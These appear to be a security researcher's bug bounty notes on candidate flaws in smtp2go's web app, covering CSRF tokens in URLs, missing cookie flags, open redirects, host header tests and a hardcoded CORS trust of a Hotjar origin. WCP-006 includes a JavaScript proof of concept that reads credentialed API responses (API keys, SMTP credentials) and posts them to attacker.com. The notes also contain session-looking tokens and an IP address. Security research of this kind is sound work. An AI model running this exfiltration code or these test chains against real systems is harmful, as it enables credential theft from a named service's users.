# Web Cache Poisoning Candidates — smtp2go

---

## Context
No CDN or caching layer detected in current traffic. WCP requires a cache to poison.
These entries document surfaces that would be exploitable if a cache is present,
and secondary findings that are worth testing regardless.

---

## [WCP-001] CSRF Token in URL Query Parameter — Referer Leakage to Third Parties

| Field | Value |
|---|---|
| **Source** | All API calls: `?action=<X>&CSRF_key=<token>` |
| **Attack type** | Token leakage via Referer header |
| **Third parties receiving Referer** | Hotjar, Chargebee, AnnounceKit, Zendesk |
| **Severity estimate** | Medium-High — CSRF token leaked + Hotjar has CORS trust (see WCP-006) |
| **Test status** | ⬜ Untested |

### Evidence
Every API endpoint call includes the CSRF token in the URL:
```
GET /api/settings/subaccounts/?action=&CSRF_key=KoU12MtjCA%2BSESDjtsuzj38WzEYXQVF%2BNjA4NJaU5vU&...
POST /api/settings/api_users/?action=load-active-users&CSRF_key=KoU12MtjCA%2BSESDjtsuzj38WzEYXQVF%2BNjA4NJaU5vU
```

Third-party resources loaded on authenticated pages (from HTTP traffic):
- `insights.hotjar.com` — **CORS trust confirmed**: `Access-Control-Allow-Origin: http://insights.hotjar.com` + `Access-Control-Allow-Credentials: true` on ALL 362 responses from app-us.smtp2go.com
- `chargebee.com/v2/chargebee.js` — on billing pages
- `announcekit.co` — product announcements (external domain)
- `widget-mediator.zopim.com` — Zendesk chat

When a user's browser loads a resource from these domains, the `Referer` header will
contain the URL of the current page. If that page triggered an API call with `?CSRF_key=`,
and the next resource load goes to a third party, the CSRF key is in the Referer.

**Critical chain with WCP-006**: Since smtp2go explicitly trusts `http://insights.hotjar.com`
with `Access-Control-Allow-Credentials: true`, an attacker with JS execution on Hotjar's
domain can use the CSRF token from Referer to make authenticated API calls cross-origin and
READ the full response — not just submit actions, but exfiltrate data.

**The CSRF key in API URLs is visible in**:
- Server access logs (stored in plaintext)
- Browser history
- Any network capture tool
- Proxy/monitoring tools
- Referer header on Hotjar script loads (critically: Hotjar has CORS trust)

### Test plan
- [ ] Log a network capture while visiting `/account/updatebilling/` (loads Chargebee)
- [ ] Check: does the `Referer` header on Chargebee requests contain `?CSRF_key=`?
- [ ] Check: does Hotjar's tracking script send back any Referer data?
- [ ] Test CSRF: if you obtain another session's CSRF_key via Referer leak, can you use it?

### Result
_Populate after testing._

---

## [WCP-002] Session Cookie Missing Secure + SameSite Flags

| Field | Value |
|---|---|
| **Source** | All authenticated responses: `Set-Cookie: session=UUID; HttpOnly; Path=/` |
| **Missing flags** | `Secure`, `SameSite` |
| **Attack type** | Cookie theft over HTTP (missing Secure), CSRF bypass (missing SameSite) |
| **Severity estimate** | Medium |
| **Test status** | ⬜ Untested |

### Evidence
```
Set-Cookie: session=26be21bf-d74d-4073-8971-b86e35d15546; HttpOnly; Path=/
```
Missing:
- `Secure` — cookie will be sent over HTTP if page is accessed via http://
- `SameSite` — no CSRF protection at cookie level (relies only on CSRF token in URL)

Note: the CSRF token already in URL params provides some CSRF protection, but
SameSite=Strict/Lax provides defense-in-depth.

### Test plan  
- [ ] Access `http://app-us.smtp2go.com/` (HTTP not HTTPS) — does the cookie get sent?
- [ ] Check if HTTP → HTTPS redirect exists (HSTS not observed in headers)
- [ ] Test CSRF: create a page that POSTs to the API with a known CSRF key — does SameSite block it?

### Result
_Populate after testing._

---

## [WCP-003] Open Redirect via server-controlled `goto`/`url` in Login Response

| Field | Value |
|---|---|
| **Source** | `layout_subaccounts_dropdown.js` — `getRedirectUrl()` function |
| **Endpoint** | `POST /api/login/` with `{ LOGIN_AS: <id>, STACK: "STACK" }` |
| **Attack type** | Open redirect (client navigates to server-provided URL) |
| **Severity estimate** | Medium — depends on whether goto is user-controllable |
| **Test status** | ⬜ Untested |

### Evidence
```js
// layout_subaccounts_dropdown.js
var getRedirectUrl = function(data, fallbackUrl) {
  if (data && data.results && data.results.goto) {
    return data.results.goto;    // ← trusted from server
  }
  if (data && data.url) {
    return data.url;             // ← trusted from server
  }
  return fallbackUrl;
};

var resp = HTML.ajax('post', END_POINTS.urls()['Login'], payload, ...);
resp.success(function(data) {
  HTML.set_time(data, null, true);
  window.location = getRedirectUrl(data, fallbackUrl);  // ← navigation
});
```

The client unconditionally navigates to `data.results.goto` or `data.url` from the
login response. If an attacker can influence this value:
1. By logging in as their own subaccount and the server reflects a user-controlled URL
2. By exploiting the IDOR in LOGIN_AS — if error responses include a redirect URL
3. If the server generates `goto` from stored subaccount data (e.g., subaccount name used as path)

### Test plan
- [ ] Perform normal subaccount login (`POST /api/login/` with valid LOGIN_AS) — does response include `goto` or `url`?
- [ ] If `goto` present: is it absolute or relative? Can it be manipulated?
- [ ] Create subaccount with name/data containing `javascript:` — does it appear in goto?
- [ ] Test invalid LOGIN_AS value — does error response contain any URL?
- [ ] Test: does the fallback URL (`END_POINTS.fronts()["Account Summary"]`) prevent open redirect?

### Result
_Populate after testing._

---

## [WCP-004] `stream_url` Open Redirect via Reports Export

| Field | Value |
|---|---|
| **Source** | `reports-summary-table.tag` — PUT to `/api/reports/summary/` |
| **Endpoint** | `PUT /api/reports/summary/?CSRF_key=<token>` |
| **Attack type** | Open redirect — `window.location.replace(res.results.stream_url)` |
| **Severity estimate** | Medium — depends on server-side stream_url validation |
| **Test status** | ⬜ Untested |

### Evidence
```js
// reports-summary-table.tag
$.ajax({
  method: "PUT",
  url: END_POINTS.urls().Summary + '?CSRF_key=' + encodeURIComponent(HTML.csrfkey),
  data: data,
  success: function(res) {
    if (res.status === 'OK') {
      HTML.set_time(res);
      window.location.replace(res.results.stream_url);  // ← navigates to server-provided URL
    }
  }
});
```

This triggers when exporting summary report data. The server returns a `stream_url` 
which the client navigates to with no client-side validation. If the export parameters
can be manipulated to make the server generate a `stream_url` pointing to an attacker-
controlled domain, this is an open redirect.

### Test plan
- [ ] Trigger a report export (PUT to `/api/reports/summary/`)
- [ ] Inspect the response — what does `stream_url` look like? Is it relative or absolute?
- [ ] Does `stream_url` include any user-controlled data (e.g., filename from a parameter)?
- [ ] Test with manipulated export parameters to see if `stream_url` can be influenced
- [ ] Try `javascript:` or `//attacker.com/` as a crafted URL if parameter-controlled

### Result
_Populate after testing._

---

## [WCP-005] X-Forwarded-Host / Host Header Injection (Standard WCP Test)

| Field | Value |
|---|---|
| **Source** | All HTML pages and API endpoints |
| **Attack type** | Host header injection → URL reflection in response |
| **Severity estimate** | Medium if reflected |
| **Test status** | ⬜ Untested |

### Context
No CDN detected. Apache/gunicorn may reflect the Host header in redirects or
absolute URLs within the response body. Standard WCP test: inject `X-Forwarded-Host`
or spoof the `Host` header, check if reflected in:
- `Location:` header on redirects
- Absolute URLs in HTML (e.g., action= attributes, canonical links)
- JSON response fields containing self-referential URLs

### Test plan
- [ ] `GET /dashboard/main/` with `Host: evil.com` — does response reflect evil.com anywhere?
- [ ] `GET /api/dashboard/main/` with `X-Forwarded-Host: evil.com` — check response
- [ ] `GET /login/` with `Host: evil.com` — does the redirect Location use evil.com?
- [ ] Check if any JSON API response includes `self` or `next` URLs that reflect the host

### Result
_Populate after testing._

---

## [WCP-006] CORS Misconfiguration — `Access-Control-Allow-Origin: http://insights.hotjar.com` on ALL Endpoints

| Field | Value |
|---|---|
| **Source** | All 362 responses from app-us.smtp2go.com — confirmed in CSV |
| **Attack type** | Third-party supply chain → credentialed cross-origin API access |
| **ACAO header** | `Access-Control-Allow-Origin: http://insights.hotjar.com` |
| **ACAC header** | `Access-Control-Allow-Credentials: true` |
| **Scope** | EVERY response: HTML pages, API endpoints, static assets |
| **Severity estimate** | High — full API access via Hotjar JS compromise |
| **Test status** | ✅ Confirmed |

### Evidence
Every single response from `app-us.smtp2go.com` (362 total) includes:
```
Access-Control-Allow-Origin: http://insights.hotjar.com
Access-Control-Allow-Credentials: true
```

This is confirmed on:
- Authenticated HTML pages: `/dashboard/main/`, `/settings/subaccounts/`, etc.
- All API endpoints: `/api/dashboard/main/`, `/api/settings/api_users/`, etc.
- Static assets: `/static/js/functions.js`, CSS files, fonts
- Special endpoints: `/end-points/`, `/zdesk_chat_auth`

Note: The ACAO uses **`http://`** (not `https://`) for Hotjar's origin. Hotjar is an HTTPS
service — the use of HTTP in the ACAO is likely a misconfiguration or legacy value.

### Attack chain
1. Attacker achieves JavaScript execution on `http://insights.hotjar.com` via:
   - XSS vulnerability in Hotjar's platform
   - DNS hijacking of insights.hotjar.com (downgrade to HTTP first, then inject)
   - Supply chain compromise of Hotjar's CDN
2. Hotjar's `<script>` tag is loaded on victim's smtp2go authenticated session
3. Attacker JS on `http://insights.hotjar.com` makes:
```js
fetch('https://app-us.smtp2go.com/api/settings/api_users/?action=load-active-users&CSRF_key=<attacker_csrfkey>', {
  credentials: 'include',
  method: 'POST'
}).then(r => r.json()).then(data => {
  // Exfiltrate: API keys, SMTP credentials, webhook URLs
  fetch('https://attacker.com/exfil', { method: 'POST', body: JSON.stringify(data) });
});
```
4. Browser allows this because ACAO explicitly permits `http://insights.hotjar.com` + ACAC:true

### Why this is high severity
- The CSRF token leaks to Hotjar via `Referer` on every API call (`?CSRF_key=<token>`)
- Combined with CORS: attacker on Hotjar's origin can: (a) receive CSRF token via Referer, (b) use it to make API calls, (c) read the full response
- No additional exploit needed — just JS execution on `insights.hotjar.com`

### Direct impact
API endpoints readable cross-origin from Hotjar:
- `/api/settings/api_users/` → API keys (full plaintext)
- `/api/settings/smtp_users/` → SMTP credentials
- `/api/settings/webhooks/` → webhook URLs and secrets
- `/api/settings/subaccounts/` → subaccount list and IDs
- `/api/dashboard/main/` → account stats and config

### Test plan
- [x] Confirm: does `curl -H 'Origin: http://insights.hotjar.com' -b 'session=<valid>'` to /api/dashboard/main/ return ACAO header?
- [x] Confirm: does the response body include the API data (not just headers)?
- [x] Test: does `Origin: https://insights.hotjar.com` (HTTPS) also work? Or only HTTP?
- [x] Test: does `Origin: http://evil.com` get reflected? (Would indicate reflection not hardcoded)
- [ ] Confirm CSRF_key appears in Referer sent to Hotjar (WCP-001 chain)

### PoC Status
End-to-end PoC confirmed working. `poc/wcp-006-cors.html` served from `http://insights.hotjar.com`,
exfil received by Python server on port 8080. Confirmed in Firefox with SameSite enforcement disabled
(`network.cookie.sameSite.laxByDefault=false`, `network.cookie.cookieBehavior=0`).
See `analysis/wcp-006-confirmed.md` for full write-up.

### Scope Ruling — 2026-04-15
❌ **NOT EXPLOITABLE WITHIN PROGRAM SCOPE.**

Exploitation requires one of:
- SameSite=Lax disabled in browser → "Outdated browsers" rule (OOS)
- MITM on `http://insights.hotjar.com` → explicitly OOS
- XSS on third-party `insights.hotjar.com` → separate program, not smtp2go scope

Additionally: `http://insights.hotjar.com` redirects 301 to `https://` via CloudFront HSTS, meaning the `http://` ACAO can never be triggered by a real browser request without MITM. The CORS header is effectively dead configuration. No subdomain takeover possible (resolves to active CloudFront).

**Confirmed as misconfiguration but not reportable.** The finding is retained for chain reference — any XSS found on smtp2go (same-site) would bypass SameSite and could leverage the full API surface documented here.

### Result
✅ **Technically confirmed** (data extracted via curl) but ❌ **out of scope for reporting.** Live testing on 2026-04-14:

```
curl -si 'https://app-us.smtp2go.com/api/dashboard/main/' \
  -H 'Origin: http://insights.hotjar.com' -H 'Cookie: session=<valid>'
→ HTTP/1.1 200 OK
→ access-control-allow-credentials: true
→ access-control-allow-origin: http://insights.hotjar.com
```

Additional findings:
- `Origin: http://evil.com` → still returns `http://insights.hotjar.com` (hardcoded, NOT reflected)
- `Origin: https://insights.hotjar.com` → still returns `http://insights.hotjar.com` (HTTP-only ACAO)
- No `Origin` header at all → STILL returns `http://insights.hotjar.com` (unconditional)
- Applies to ALL API endpoints, HTML pages, and static assets (confirmed on /api/dashboard/main/)

The CORS header is hardcoded and always present regardless of Origin header value.
Cannot inject arbitrary allowed origins — only `http://insights.hotjar.com` is trusted.
But that trust is unconditional: any JS running on that HTTP origin gets full credentialed API access.

---

## [WCP-007] `login_id` Passed as URL GET Parameter — Session Transition Token in URL

| Field | Value |
|---|---|
| **Source** | CSV row 186 — `GET /dashboard/main/?login_id=.eJw...` |
| **Attack type** | Session token in URL — leakage surface via logs, Referer, browser history |
| **Observed behavior** | Server responds: 302 + clears login_id + sets JWT cookie |
| **Mitigation present** | `Referrer-Policy: no-referrer` + `Cache-Control: no-store` on 302 |
| **Severity estimate** | Medium — mitigated by Referrer-Policy but still in server logs/history |
| **Test status** | ⬜ Untested |

### Evidence
Observed in CSV row 186:
```
GET /dashboard/main/?login_id=.eJwFwd3aQjAAAOB76bSDHjPMoSF16MFMYxtqCR3clCCWFhGMr-97l89Hg9SUyGH5JW2... HTTP/1.1
Host: app-us.smtp2go.com
```

Server response:
```
HTTP/1.1 302 FOUND
location: /dashboard/main/
referrer-policy: no-referrer
cache-control: no-store
set-cookie: login_id=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=/
set-cookie: 1XJgM5twoV0e8IhkwW0BQuDwzkz=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The `login_id` Flask signed token is used as a one-time URL parameter to authenticate
the session transition after `POST /api/login/` with `LOGIN_AS`. The flow is:
1. `POST /api/login/` → server sets `login_id` cookie
2. Client reads cookie: `Cookie.read("login_id")`
3. Client GETs `/dashboard/main/?login_id=<cookie_value>`
4. Server validates, then: clears login_id cookie + sets JWT cookie + 302 to clean URL

Server correctly applies `Referrer-Policy: no-referrer` to prevent Referer leakage.
However, the token still appears in: server access logs, browser history, proxy logs.

### JWT Cookie Revealed
This 302 response is where `1XJgM5twoV0e8IhkwW0BQuDwzkz` is set. It's smtp2go's own server
(gunicorn), not a third-party. The JWT contains:
```json
{ "external_id": "1010395", "user-agent": "...", "remote-addr": "75.159.128.178" }
```
Cookie flags: HttpOnly ✅, Secure ❌ (missing), SameSite ❌ (missing)
Expiry: 30 days (`Max-Age=2592000`)

### Test plan
- [ ] Capture the `GET /dashboard/main/?login_id=<token>` request during a LOGIN_AS flow
- [ ] Does the `login_id` token appear in server access logs? (check via timing/error response)
- [ ] Is the `login_id` token single-use? (replay the same token — does server reject second use?)
- [ ] Test JWT cookie without Secure flag: access via `http://` — is cookie sent?
- [ ] Test JWT alg:none with modified `external_id` — is it validated server-side?

### Result
_Populate after testing._
